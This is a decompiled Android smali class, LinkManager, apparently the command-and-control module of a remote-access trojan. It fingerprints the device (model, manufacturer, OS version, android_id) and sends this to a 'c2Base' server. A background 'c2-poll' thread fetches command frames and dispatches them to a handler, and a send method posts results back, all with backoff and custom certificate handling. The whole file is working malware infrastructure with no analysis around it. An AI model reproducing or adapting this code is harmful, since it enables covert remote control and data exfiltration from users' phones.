.class public Lcom/piupiupiu/LinkManager;
.super Ljava/lang/Object;
.source "LinkManager.java"


# annotations
.annotation system Ldalvik/annotation/MemberClasses;
    value = {
        Lcom/piupiupiu/LinkManager$FrameHandler;
    }
.end annotation


# static fields
.field private static final DRAIN_PAUSE_MS:I = 0x12c

.field private static final JSON:Lokhttp3/MediaType;

.field private static final MAX_BACKOFF_SEC:I = 0x3c

.field private static final POLL_SEC:I = 0x8

.field private static final TAG:Ljava/lang/String; = "core"

.field private static final ourInstance:Lcom/piupiupiu/LinkManager;


# instance fields
.field private volatile backoffSec:I

.field private final baseUrl:Ljava/lang/String;

.field private final client:Lokhttp3/OkHttpClient;

.field private volatile handler:Lcom/piupiupiu/LinkManager$FrameHandler;

.field private final pollQuery:Ljava/lang/String;

.field private final reportQuery:Ljava/lang/String;

.field private final running:Ljava/util/concurrent/atomic/AtomicBoolean;


# direct methods
.method static constructor <clinit>()V
    .locals 1

    .prologue
    .line 42
    const-string v0, "application/json; charset=utf-8"

    invoke-static {v0}, Lokhttp3/MediaType;->parse(Ljava/lang/String;)Lokhttp3/MediaType;

    move-result-object v0

    sput-object v0, Lcom/piupiupiu/LinkManager;->JSON:Lokhttp3/MediaType;

    .line 44
    new-instance v0, Lcom/piupiupiu/LinkManager;

    invoke-direct {v0}, Lcom/piupiupiu/LinkManager;-><init>()V

    sput-object v0, Lcom/piupiupiu/LinkManager;->ourInstance:Lcom/piupiupiu/LinkManager;

    return-void
.end method

.method private constructor <init>()V
    .locals 3

    .prologue
    .line 60
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    .line 52
    new-instance v1, Ljava/util/concurrent/atomic/AtomicBoolean;

    const/4 v2, 0x0

    invoke-direct {v1, v2}, Ljava/util/concurrent/atomic/AtomicBoolean;-><init>(Z)V

    iput-object v1, p0, Lcom/piupiupiu/LinkManager;->running:Ljava/util/concurrent/atomic/AtomicBoolean;

    .line 53
    const/4 v1, 0x1

    iput v1, p0, Lcom/piupiupiu/LinkManager;->backoffSec:I

    .line 61
    invoke-static {}, Lcom/piupiupiu/LinkManager;->buildClient()Lokhttp3/OkHttpClient;

    move-result-object v1

    iput-object v1, p0, Lcom/piupiupiu/LinkManager;->client:Lokhttp3/OkHttpClient;

    .line 64
    invoke-static {}, Lcom/piupiupiu/CoreService;->getContextOfApplication()Landroid/content/Context;

    move-result-object v1

    invoke-virtual {v1}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v1

    const-string v2, "android_id"

    .line 63
    invoke-static {v1, v2}, Landroid/provider/Settings$Secure;->getString(Landroid/content/ContentResolver;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    .line 67
    .local v0, "deviceID":Ljava/lang/String;
    invoke-static {}, Lcom/piupiupiu/AppConfig;->c2Base()Ljava/lang/String;

    move-result-object v1

    iput-object v1, p0, Lcom/piupiupiu/LinkManager;->baseUrl:Ljava/lang/String;

    .line 68
    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    const-string v2, "?d1="

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    sget-object v2, Landroid/os/Build;->MODEL:Ljava/lang/String;

    invoke-static {v2}, Lcom/piupiupiu/LinkManager;->enc(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v2, "&"

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v2, "d2"

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v2, "="

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    sget-object v2, Landroid/os/Build;->MANUFACTURER:Ljava/lang/String;

    .line 69
    invoke-static {v2}, Lcom/piupiupiu/LinkManager;->enc(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v2, "&"

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v2, "d3"

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v2, "="

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    sget-object v2, Landroid/os/Build$VERSION;->RELEASE:Ljava/lang/String;

    .line 70
    invoke-static {v2}, Lcom/piupiupiu/LinkManager;->enc(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v2, "&"

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v2, "d4"

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v2, "="

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    .line 71
    invoke-static {v0}, Lcom/piupiupiu/LinkManager;->enc(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    iput-object v1, p0, Lcom/piupiupiu/LinkManager;->pollQuery:Ljava/lang/String;

    .line 72
    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    const-string v2, "?d4="

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-static {v0}, Lcom/piupiupiu/LinkManager;->enc(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    iput-object v1, p0, Lcom/piupiupiu/LinkManager;->reportQuery:Ljava/lang/String;

    .line 73
    return-void
.end method

.method static synthetic access$000(Lcom/piupiupiu/LinkManager;)V
    .locals 0
    .param p0, "x0"    # Lcom/piupiupiu/LinkManager;

    .prologue
    .line 31
    invoke-direct {p0}, Lcom/piupiupiu/LinkManager;->pollLoop()V

    return-void
.end method

.method private static buildClient()Lokhttp3/OkHttpClient;
    .locals 9

    .prologue
    .line 80
    new-instance v3, Lcom/piupiupiu/LinkManager$1;

    invoke-direct {v3}, Lcom/piupiupiu/LinkManager$1;-><init>()V

    .line 111
    .local v3, "pinTm":Ljavax/net/ssl/X509TrustManager;
    :try_start_0
    const-string v5, "TLS"

    invoke-static {v5}, Ljavax/net/ssl/SSLContext;->getInstance(Ljava/lang/String;)Ljavax/net/ssl/SSLContext;

    move-result-object v0

    .line 112
    .local v0, "ctx":Ljavax/net/ssl/SSLContext;
    const/4 v5, 0x0

    const/4 v6, 0x1

    new-array v6, v6, [Ljavax/net/ssl/TrustManager;

    const/4 v7, 0x0

    aput-object v3, v6, v7

    new-instance v7, Ljava/security/SecureRandom;

    invoke-direct {v7}, Ljava/security/SecureRandom;-><init>()V

    invoke-virtual {v0, v5, v6, v7}, Ljavax/net/ssl/SSLContext;->init([Ljavax/net/ssl/KeyManager;[Ljavax/net/ssl/TrustManager;Ljava/security/SecureRandom;)V

    .line 113
    invoke-virtual {v0}, Ljavax/net/ssl/SSLContext;->getSocketFactory()Ljavax/net/ssl/SSLSocketFactory;

    move-result-object v4

    .line 114
    .local v4, "sf":Ljavax/net/ssl/SSLSocketFactory;
    new-instance v2, Lcom/piupiupiu/LinkManager$2;

    invoke-direct {v2}, Lcom/piupiupiu/LinkManager$2;-><init>()V

    .line 121
    .local v2, "hv":Ljavax/net/ssl/HostnameVerifier;
    new-instance v5, Lokhttp3/OkHttpClient$Builder;

    invoke-direct {v5}, Lokhttp3/OkHttpClient$Builder;-><init>()V

    .line 122
    invoke-virtual {v5, v4, v3}, Lokhttp3/OkHttpClient$Builder;->sslSocketFactory(Ljavax/net/ssl/SSLSocketFactory;Ljavax/net/ssl/X509TrustManager;)Lokhttp3/OkHttpClient$Builder;

    move-result-object v5

    .line 123
    invoke-virtual {v5, v2}, Lokhttp3/OkHttpClient$Builder;->hostnameVerifier(Ljavax/net/ssl/HostnameVerifier;)Lokhttp3/OkHttpClient$Builder;

    move-result-object v5

    const-wide/16 v6, 0xa

    sget-object v8, Ljava/util/concurrent/TimeUnit;->SECONDS:Ljava/util/concurrent/TimeUnit;

    .line 124
    invoke-virtual {v5, v6, v7, v8}, Lokhttp3/OkHttpClient$Builder;->connectTimeout(JLjava/util/concurrent/TimeUnit;)Lokhttp3/OkHttpClient$Builder;

    move-result-object v5

    const-wide/16 v6, 0xf

    sget-object v8, Ljava/util/concurrent/TimeUnit;->SECONDS:Ljava/util/concurrent/TimeUnit;

    .line 125
    invoke-virtual {v5, v6, v7, v8}, Lokhttp3/OkHttpClient$Builder;->readTimeout(JLjava/util/concurrent/TimeUnit;)Lokhttp3/OkHttpClient$Builder;

    move-result-object v5

    const-wide/16 v6, 0xf

    sget-object v8, Ljava/util/concurrent/TimeUnit;->SECONDS:Ljava/util/concurrent/TimeUnit;

    .line 126
    invoke-virtual {v5, v6, v7, v8}, Lokhttp3/OkHttpClient$Builder;->writeTimeout(JLjava/util/concurrent/TimeUnit;)Lokhttp3/OkHttpClient$Builder;

    move-result-object v5

    .line 127
    invoke-virtual {v5}, Lokhttp3/OkHttpClient$Builder;->build()Lokhttp3/OkHttpClient;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    move-result-object v5

    .line 121
    return-object v5

    .line 128
    .end local v0    # "ctx":Ljavax/net/ssl/SSLContext;
    .end local v2    # "hv":Ljavax/net/ssl/HostnameVerifier;
    .end local v4    # "sf":Ljavax/net/ssl/SSLSocketFactory;
    :catch_0
    move-exception v1

    .line 129
    .local v1, "e":Ljava/lang/Exception;
    new-instance v5, Ljava/lang/RuntimeException;

    const-string v6, "build pinned client failed"

    invoke-direct {v5, v6, v1}, Ljava/lang/RuntimeException;-><init>(Ljava/lang/String;Ljava/lang/Throwable;)V

    throw v5
.end method

.method private static enc(Ljava/lang/String;)Ljava/lang/String;
    .locals 1
    .param p0, "s"    # Ljava/lang/String;

    .prologue
    .line 134
    if-nez p0, :cond_0

    const-string v0, ""

    :goto_0
    return-object v0

    :cond_0
    invoke-static {p0}, Landroid/net/Uri;->encode(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    goto :goto_0
.end method

.method private fetchOne()Z
    .locals 12
    .annotation system Ldalvik/annotation/Throws;
        value = {
            Ljava/lang/Exception;
        }
    .end annotation

    .prologue
    const/4 v8, 0x0

    .line 181
    new-instance v9, Lokhttp3/Request$Builder;

    invoke-direct {v9}, Lokhttp3/Request$Builder;-><init>()V

    new-instance v10, Ljava/lang/StringBuilder;

    invoke-direct {v10}, Ljava/lang/StringBuilder;-><init>()V

    iget-object v11, p0, Lcom/piupiupiu/LinkManager;->baseUrl:Ljava/lang/String;

    invoke-virtual {v10, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v10

    iget-object v11, p0, Lcom/piupiupiu/LinkManager;->pollQuery:Ljava/lang/String;

    invoke-virtual {v10, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v10

    invoke-virtual {v10}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v10

    invoke-virtual {v9, v10}, Lokhttp3/Request$Builder;->url(Ljava/lang/String;)Lokhttp3/Request$Builder;

    move-result-object v9

    invoke-virtual {v9}, Lokhttp3/Request$Builder;->get()Lokhttp3/Request$Builder;

    move-result-object v9

    invoke-virtual {v9}, Lokhttp3/Request$Builder;->build()Lokhttp3/Request;

    move-result-object v4

    .line 182
    .local v4, "req":Lokhttp3/Request;
    iget-object v9, p0, Lcom/piupiupiu/LinkManager;->client:Lokhttp3/OkHttpClient;

    invoke-virtual {v9, v4}, Lokhttp3/OkHttpClient;->newCall(Lokhttp3/Request;)Lokhttp3/Call;

    move-result-object v9

    invoke-interface {v9}, Lokhttp3/Call;->execute()Lokhttp3/Response;

    move-result-object v5

    .line 184
    .local v5, "resp":Lokhttp3/Response;
    :try_start_0
    invoke-virtual {v5}, Lokhttp3/Response;->code()I
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    move-result v9

    const/16 v10, 0xc8

    if-eq v9, v10, :cond_0

    .line 210
    invoke-virtual {v5}, Lokhttp3/Response;->close()V

    .line 208
    :goto_0
    return v8

    .line 187
    :cond_0
    :try_start_1
    invoke-virtual {v5}, Lokhttp3/Response;->body()Lokhttp3/ResponseBody;
    :try_end_1
    .catchall {:try_start_1 .. :try_end_1} :catchall_0

    move-result-object v0

    .line 188
    .local v0, "body":Lokhttp3/ResponseBody;
    if-nez v0, :cond_1

    .line 210
    invoke-virtual {v5}, Lokhttp3/Response;->close()V

    goto :goto_0

    .line 191
    :cond_1
    :try_start_2
    invoke-virtual {v0}, Lokhttp3/ResponseBody;->string()Ljava/lang/String;

    move-result-object v6

    .line 192
    .local v6, "txt":Ljava/lang/String;
    if-eqz v6, :cond_2

    invoke-virtual {v6}, Ljava/lang/String;->trim()Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v9}, Ljava/lang/String;->isEmpty()Z
    :try_end_2
    .catchall {:try_start_2 .. :try_end_2} :catchall_0

    move-result v9

    if-eqz v9, :cond_3

    .line 210
    :cond_2
    invoke-virtual {v5}, Lokhttp3/Response;->close()V

    goto :goto_0

    .line 195
    :cond_3
    :try_start_3
    new-instance v1, Lorg/json/JSONObject;

    invoke-direct {v1, v6}, Lorg/json/JSONObject;-><init>(Ljava/lang/String;)V

    .line 196
    .local v1, "frame":Lorg/json/JSONObject;
    const-string v9, "t"

    const-string v10, ""

    invoke-virtual {v1, v9, v10}, Lorg/json/JSONObject;->optString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v7

    .line 197
    .local v7, "type":Ljava/lang/String;
    invoke-virtual {v7}, Ljava/lang/String;->length()I
    :try_end_3
    .catchall {:try_start_3 .. :try_end_3} :catchall_0

    move-result v9

    if-nez v9, :cond_4

    .line 210
    invoke-virtual {v5}, Lokhttp3/Response;->close()V

    goto :goto_0

    .line 200
    :cond_4
    :try_start_4
    const-string v8, "x"

    invoke-virtual {v1, v8}, Lorg/json/JSONObject;->optJSONObject(Ljava/lang/String;)Lorg/json/JSONObject;

    move-result-object v3

    .line 201
    .local v3, "payload":Lorg/json/JSONObject;
    if-nez v3, :cond_5

    .line 202
    new-instance v3, Lorg/json/JSONObject;

    .end local v3    # "payload":Lorg/json/JSONObject;
    invoke-direct {v3}, Lorg/json/JSONObject;-><init>()V

    .line 204
    .restart local v3    # "payload":Lorg/json/JSONObject;
    :cond_5
    iget-object v2, p0, Lcom/piupiupiu/LinkManager;->handler:Lcom/piupiupiu/LinkManager$FrameHandler;

    .line 205
    .local v2, "h":Lcom/piupiupiu/LinkManager$FrameHandler;
    if-eqz v2, :cond_6

    .line 206
    invoke-interface {v2, v7, v3}, Lcom/piupiupiu/LinkManager$FrameHandler;->onFrame(Ljava/lang/String;Lorg/json/JSONObject;)V
    :try_end_4
    .catchall {:try_start_4 .. :try_end_4} :catchall_0

    .line 208
    :cond_6
    const/4 v8, 0x1

    .line 210
    invoke-virtual {v5}, Lokhttp3/Response;->close()V

    goto :goto_0

    .end local v0    # "body":Lokhttp3/ResponseBody;
    .end local v1    # "frame":Lorg/json/JSONObject;
    .end local v2    # "h":Lcom/piupiupiu/LinkManager$FrameHandler;
    .end local v3    # "payload":Lorg/json/JSONObject;
    .end local v6    # "txt":Ljava/lang/String;
    .end local v7    # "type":Ljava/lang/String;
    :catchall_0
    move-exception v8

    invoke-virtual {v5}, Lokhttp3/Response;->close()V

    .line 211
    throw v8
.end method

.method public static getInstance()Lcom/piupiupiu/LinkManager;
    .locals 1

    .prologue
    .line 138
    sget-object v0, Lcom/piupiupiu/LinkManager;->ourInstance:Lcom/piupiupiu/LinkManager;

    return-object v0
.end method

.method private pollLoop()V
    .locals 6

    .prologue
    .line 159
    :goto_0
    iget-object v3, p0, Lcom/piupiupiu/LinkManager;->running:Ljava/util/concurrent/atomic/AtomicBoolean;

    invoke-virtual {v3}, Ljava/util/concurrent/atomic/AtomicBoolean;->get()Z

    move-result v3

    if-eqz v3, :cond_3

    .line 163
    :cond_0
    :try_start_0
    invoke-direct {p0}, Lcom/piupiupiu/LinkManager;->fetchOne()Z

    move-result v1

    .line 164
    .local v1, "got":Z
    if-eqz v1, :cond_1

    .line 165
    const-wide/16 v4, 0x12c

    invoke-static {v4, v5}, Ljava/lang/Thread;->sleep(J)V

    .line 167
    :cond_1
    if-eqz v1, :cond_2

    iget-object v3, p0, Lcom/piupiupiu/LinkManager;->running:Ljava/util/concurrent/atomic/AtomicBoolean;

    invoke-virtual {v3}, Ljava/util/concurrent/atomic/AtomicBoolean;->get()Z

    move-result v3

    if-nez v3, :cond_0

    .line 168
    :cond_2
    const/4 v3, 0x1

    iput v3, p0, Lcom/piupiupiu/LinkManager;->backoffSec:I

    .line 169
    const/16 v3, 0x8

    invoke-direct {p0, v3}, Lcom/piupiupiu/LinkManager;->sleep(I)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    .line 170
    .end local v1    # "got":Z
    :catch_0
    move-exception v0

    .line 171
    .local v0, "e":Ljava/lang/Exception;
    const-string v3, "core"

    const-string v4, "poll failed"

    invoke-static {v3, v4, v0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I

    .line 172
    iget v2, p0, Lcom/piupiupiu/LinkManager;->backoffSec:I

    .line 173
    .local v2, "wait":I
    iget v3, p0, Lcom/piupiupiu/LinkManager;->backoffSec:I

    mul-int/lit8 v3, v3, 0x2

    const/16 v4, 0x3c

    invoke-static {v3, v4}, Ljava/lang/Math;->min(II)I

    move-result v3

    iput v3, p0, Lcom/piupiupiu/LinkManager;->backoffSec:I

    .line 174
    invoke-direct {p0, v2}, Lcom/piupiupiu/LinkManager;->sleep(I)V

    goto :goto_0

    .line 177
    .end local v0    # "e":Ljava/lang/Exception;
    .end local v2    # "wait":I
    :cond_3
    return-void
.end method

.method private sleep(I)V
    .locals 6
    .param p1, "sec"    # I

    .prologue
    .line 231
    int-to-long v2, p1

    const-wide/16 v4, 0x3e8

    mul-long/2addr v2, v4

    :try_start_0
    invoke-static {v2, v3}, Ljava/lang/Thread;->sleep(J)V
    :try_end_0
    .catch Ljava/lang/InterruptedException; {:try_start_0 .. :try_end_0} :catch_0

    .line 235
    :goto_0
    return-void

    .line 232
    :catch_0
    move-exception v0

    .line 233
    .local v0, "e":Ljava/lang/InterruptedException;
    invoke-static {}, Ljava/lang/Thread;->currentThread()Ljava/lang/Thread;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/Thread;->interrupt()V

    goto :goto_0
.end method


# virtual methods
.method public connect()V
    .locals 3

    .prologue
    .line 147
    iget-object v0, p0, Lcom/piupiupiu/LinkManager;->running:Ljava/util/concurrent/atomic/AtomicBoolean;

    const/4 v1, 0x1

    invoke-virtual {v0, v1}, Ljava/util/concurrent/atomic/AtomicBoolean;->getAndSet(Z)Z

    move-result v0

    if-eqz v0, :cond_0

    .line 156
    :goto_0
    return-void

    .line 150
    :cond_0
    new-instance v0, Ljava/lang/Thread;

    new-instance v1, Lcom/piupiupiu/LinkManager$3;

    invoke-direct {v1, p0}, Lcom/piupiupiu/LinkManager$3;-><init>(Lcom/piupiupiu/LinkManager;)V

    const-string v2, "c2-poll"

    invoke-direct {v0, v1, v2}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;Ljava/lang/String;)V

    .line 155
    invoke-virtual {v0}, Ljava/lang/Thread;->start()V

    goto :goto_0
.end method

.method public send(Ljava/lang/String;Ljava/lang/Object;)V
    .locals 8
    .param p1, "type"    # Ljava/lang/String;
    .param p2, "payload"    # Ljava/lang/Object;

    .prologue
    .line 217
    :try_start_0
    new-instance v2, Lorg/json/JSONObject;

    invoke-direct {v2}, Lorg/json/JSONObject;-><init>()V

    .line 218
    .local v2, "frame":Lorg/json/JSONObject;
    const-string v5, "t"

    invoke-virtual {v2, v5, p1}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 219
    const-string v5, "x"

    invoke-virtual {v2, v5, p2}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 220
    sget-object v5, Lcom/piupiupiu/LinkManager;->JSON:Lokhttp3/MediaType;

    invoke-virtual {v2}, Lorg/json/JSONObject;->toString()Ljava/lang/String;

    move-result-object v6

    invoke-static {v5, v6}, Lokhttp3/RequestBody;->create(Lokhttp3/MediaType;Ljava/lang/String;)Lokhttp3/RequestBody;

    move-result-object v0

    .line 221
    .local v0, "body":Lokhttp3/RequestBody;
    new-instance v5, Lokhttp3/Request$Builder;

    invoke-direct {v5}, Lokhttp3/Request$Builder;-><init>()V

    new-instance v6, Ljava/lang/StringBuilder;

    invoke-direct {v6}, Ljava/lang/StringBuilder;-><init>()V

    iget-object v7, p0, Lcom/piupiupiu/LinkManager;->baseUrl:Ljava/lang/String;

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    iget-object v7, p0, Lcom/piupiupiu/LinkManager;->reportQuery:Ljava/lang/String;

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v5, v6}, Lokhttp3/Request$Builder;->url(Ljava/lang/String;)Lokhttp3/Request$Builder;

    move-result-object v5

    invoke-virtual {v5, v0}, Lokhttp3/Request$Builder;->post(Lokhttp3/RequestBody;)Lokhttp3/Request$Builder;

    move-result-object v5

    invoke-virtual {v5}, Lokhttp3/Request$Builder;->build()Lokhttp3/Request;

    move-result-object v3

    .line 222
    .local v3, "req":Lokhttp3/Request;
    iget-object v5, p0, Lcom/piupiupiu/LinkManager;->client:Lokhttp3/OkHttpClient;

    invoke-virtual {v5, v3}, Lokhttp3/OkHttpClient;->newCall(Lokhttp3/Request;)Lokhttp3/Call;

    move-result-object v5

    invoke-interface {v5}, Lokhttp3/Call;->execute()Lokhttp3/Response;

    move-result-object v4

    .line 223
    .local v4, "resp":Lokhttp3/Response;
    invoke-virtual {v4}, Lokhttp3/Response;->close()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 227
    .end local v0    # "body":Lokhttp3/RequestBody;
    .end local v2    # "frame":Lorg/json/JSONObject;
    .end local v3    # "req":Lokhttp3/Request;
    .end local v4    # "resp":Lokhttp3/Response;
    :goto_0
    return-void

    .line 224
    :catch_0
    move-exception v1

    .line 225
    .local v1, "e":Ljava/lang/Exception;
    const-string v5, "core"

    const-string v6, "report failed"

    invoke-static {v5, v6, v1}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I

    goto :goto_0
.end method

.method public setHandler(Lcom/piupiupiu/LinkManager$FrameHandler;)V
    .locals 0
    .param p1, "h"    # Lcom/piupiupiu/LinkManager$FrameHandler;

    .prologue
    .line 142
    iput-object p1, p0, Lcom/piupiupiu/LinkManager;->handler:Lcom/piupiupiu/LinkManager$FrameHandler;

    .line 143
    return-void
.end method
